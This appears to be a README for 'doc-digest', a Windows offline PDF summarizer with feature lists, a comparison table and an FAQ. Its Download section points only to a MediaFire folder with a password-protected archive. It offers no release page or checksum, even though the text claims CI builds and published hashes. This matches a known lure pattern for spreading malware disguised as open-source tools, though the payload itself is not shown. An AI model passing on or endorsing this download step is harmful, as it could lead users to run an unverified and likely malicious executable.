# doc-digest

📖 Free, open-source document summarizer for Windows — long PDFs into digests and Q&A with local LLMs. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Long-document handling** — map-reduce passes digest 500-page PDFs that would blow a single context window
- ✅ **Chapter outline** — structure rebuilt as a collapsible outline before the summary is written
- ✅ **Key point cards** — decisions, numbers and named entities pulled out as scannable cards
- ✅ **Q&A with citations** — ask about the document and every answer links to the page it came from
- ✅ **Batch digests** — a folder of reports each summarized into its own markdown file
- ✅ **Quote finder** — search the original text for a phrase and jump to the passage
- ✅ **100 MB self-contained exe** — runtime bundled, models downloaded separately, offline after that, MIT

## Why doc-digest

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **doc-digest** | ChatPDF | NotebookLM | Manual reading |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid tiers | Free web | Your weekend |
| Open source | **Yes** | No | No | N/A |
| Documents stay local | **Yes** | Upload | Upload | Yes
| Works on 500-page files | **Yes** | Partial | Partial | Yes slowly
| Batch folder digests | **Yes** | One by one | No | No |
| Portable, no install | **Yes, 100 MB** | Browser | Browser | N/A

## FAQ

**summarize long PDFs offline without uploading confidential documents?**

Cloud PDF chat tools want the full document uploaded, which rules out contracts and internal reports. doc-digest processes long files locally in passes, builds an outline and answers questions with page citations. It is a 100 MB portable exe, MIT, offline, and can digest a whole folder while you do something else.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark reader (#121417, amber #D97706): outline tree left with 24 chapters, digest pane right with key point cards, citation chips linking to page numbers.
2. Q&A panel: question about payment terms typed in the bar, answer with two highlighted page links beneath, confidence note chip on the row.
3. Batch view: 14 report files with digest status and lengths, per-file markdown checkmarks, folder output path chip, progress at 9 of 14.

## Download

| Source | Link |
|---|---|
| 💾 **Installer doc-digest** | [Installer doc-digest](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).